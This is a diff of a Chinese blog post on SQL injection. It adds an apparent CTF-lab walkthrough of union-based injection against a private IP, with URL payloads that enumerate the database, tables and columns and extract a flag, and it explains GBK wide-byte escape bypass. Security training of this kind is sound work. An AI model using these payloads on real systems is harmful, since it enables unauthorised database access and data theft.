@@ -16,10 +16,19 @@
 <meta property="og:site_name" content="Jared博客">
 <meta property="og:description" content="SQL注入 一般来说，SQL注入一般存在于形如：http://xxx.xxx.xxx/abc.asp?id=XX 等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过滤，存在SQL注入的可能">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-04-28T02:16:10.219Z">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUUuq.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUdbV.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUBUU.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUaD0.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUtvn.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMU0ET.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUsC4.jpg">
+<meta property="og:image" content="https://s2.ax1x.com/2019/04/28/EMUD5F.jpg">
+<meta property="og:updated_time" content="2019-04-28T02:43:15.055Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入">
 <meta name="twitter:description" content="SQL注入 一般来说，SQL注入一般存在于形如：http://xxx.xxx.xxx/abc.asp?id=XX 等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过滤，存在SQL注入的可能">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/04/28/EMUUuq.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Jared博客" type="application/atom+xml">
   
@@ -309,9 +318,8 @@
       
           
         <h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p> 一般来说，SQL注入一般存在于形如：<a href="http://xxx.xxx.xxx/abc.asp?id=XX" target="_blank" rel="noopener">http://xxx.xxx.xxx/abc.asp?id=XX</a> 等带有参数的ASP动态网页中，有时一个动态网页中可能只有一个参数，有时可能有N个参数，有时是整型参数，有时是字符串型参数，不能一概而论。总之只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在SQL注入。如果ASP程序员没有安全意识，不进行必要的字符过滤，存在SQL注入的可能性就非常大。<br> <a id="more"></a><br> SQL注射能使攻击者绕过认证机制，完全控制远程服务器上的数据库。 SQL是结构化查询语言的简称，它是访问数据库的事实标准。目前，大多数Web应用都使用SQL数据库来存放应用程序的数据。几乎所有的Web应用在后台 都使用某种SQL数据库。跟大多数语言一样，SQL语法允许数据库命令和用户数据混杂在一起的。如果开发人员不细心的话，用户数据就有可能被解释成命令， 这样的话，远程用户就不仅能向Web应用输入数据，而且还可以在数据库上执行任意命令了。</p>
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br> 用户提交的数据在后台数据库中执行，没有任何事物数据（报错信息，执行sql的数据）专递到前端，这种列些类型就是盲注</p>
-<h4 id="基于时间的盲注"><a href="#基于时间的盲注" class="headerlink" title="基于时间的盲注"></a>基于时间的盲注</h4><p>  利用方法并结合浏览器显示效果判断payload的真确性<br> 使用bool–&gt;页面是否显示正常<br> 使用time–&gt;页面加载时间</p>
-<h3 id="HTTP报头追踪"><a href="#HTTP报头追踪" class="headerlink" title="HTTP报头追踪"></a>HTTP报头追踪</h3><p>服务器启动trace方法，用来回显服务器收到的请求，利用这个方法如下攻击：<br>     （1）进行XSS攻击,获取用户浏览器中cookie<br>     （2）通过其返回的信息了解到站点前端的信息，缓冲信息等<br>     （3）如何站点设置HTTPONLY头标记，或者禁止通过脚本读取cookie,使用该方法可以读到cookie</p>
+<p> <a href="http://192.168.11.103/?id=1找到URl判断有注入" target="_blank" rel="noopener">http://192.168.11.103/?id=1找到URl判断有注入</a><br> <img src="https://s2.ax1x.com/2019/04/28/EMUUuq.jpg" alt="image"><br> <a href="http://192.168.11.103/?id=1&#39;" target="_blank" rel="noopener">http://192.168.11.103/?id=1&#39;</a> order by 2%23确定列数<br> <img src="https://s2.ax1x.com/2019/04/28/EMUdbV.jpg" alt="image"><br> <a href="http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,2%23确定显示位" target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,2%23确定显示位</a><br> <img src="https://s2.ax1x.com/2019/04/28/EMUBUU.jpg" alt="image"><br> <a href="http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,user()%23选择注入点" target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,user()%23选择注入点</a><br> <img src="https://s2.ax1x.com/2019/04/28/EMUaD0.jpg" alt="image"><br> <a href="http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,(database())%23" target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,(database())%23</a><br>查找当前数据库名<br><img src="https://s2.ax1x.com/2019/04/28/EMUtvn.jpg" alt="image"><br><a href="http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1," target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;+UNION+ALL+SELECT+1,</a>(select group_concat(distinct table_name)  from information_schema.columns  where table_schema=’security’)%23<br>查看当前数据库下的表名<br><img src="https://s2.ax1x.com/2019/04/28/EMU0ET.jpg" alt="image"><br><a href="http://192.168.11.103/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;</a> +UNION+ALL+SELECT+1,(select group_concat(distinct column_name ) from information_schema.columns where table_schema=database() and table_name=’flag’)%23<br>提取指定表的字段<br><img src="https://s2.ax1x.com/2019/04/28/EMUsC4.jpg" alt="image"><br><a href="http://192.168.11.103/?id=-1&#39;" target="_blank" rel="noopener">http://192.168.11.103/?id=-1&#39;</a> +UNION+ALL+SELECT+1,(select concat_ws(0x7e,id,flag) from flag limit 0,1)%23<br>获取flag<br><img src="https://s2.ax1x.com/2019/04/28/EMUD5F.jpg" alt="image"></p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p> 盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。<br> 用户提交的数据在后台数据库中执行，没有任何事物数据（报错信息，执行sql的数据）专递到前端，这种列些类型就是盲注</p>
 <h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p> 宽字节注入是利用mysql的一个特性，mysql在使用GBK编码（GBK就是常说的宽字节之一，实际上只有两字节）的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围），而当我们输入有单引号时会自动加入\进行转义而变为\’（在PHP配置文件中magic_quotes_gpc=On的情况下或者使用addslashes函数，icov函数，mysql_real_escape_string函数、mysql_escape_string函数等，提交的参数中如果带有单引号’，就会被自动转义\’，使得多数注入攻击无效），由于宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，将后面的一个字节与前一个大于128的ascii码进行组合成为一个完整的字符（mysql判断一个字符是不是汉字，首先两个字符时一个汉字，另外根据gbk编码，第一个字节ascii码大于128，基本上就可以了），此时’前的\就被吃了，我们就可以使用’了，利用这个特性从而可实施SQL注入的利用</p>
 
       
@@ -324,7 +332,7 @@
         <p><span>本文标题:</span><a href="/2019/04/12/zhuru/">SQL注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 大猫 的个人博客">大猫</a></p>
         <p><span>发布时间:</span>2019年04月12日 - 09时27分</p>
-        <p><span>最后更新:</span>2019年04月28日 - 10时16分</p>
+        <p><span>最后更新:</span>2019年04月28日 - 10时43分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/04/12/zhuru/" title="SQL注入">http://yoursite.com/2019/04/12/zhuru/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/04/12/zhuru/　　作者: 大猫" title></span>
@@ -352,7 +360,7 @@
 
     <div id="toc" class="toc-article">
     <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">2.</span> <span class="toc-text">盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#基于时间的盲注"><span class="toc-number">2.1.</span> <span class="toc-text">基于时间的盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP报头追踪"><span class="toc-number">3.</span> <span class="toc-text">HTTP报头追踪</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入"><span class="toc-number">4.</span> <span class="toc-text">宽字节注入</span></a></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL注入"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">2.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#宽字节注入"><span class="toc-number">3.</span> <span class="toc-text">宽字节注入</span></a></li></ol>
 </div>
 <style>
     .left-col .switch-btn {
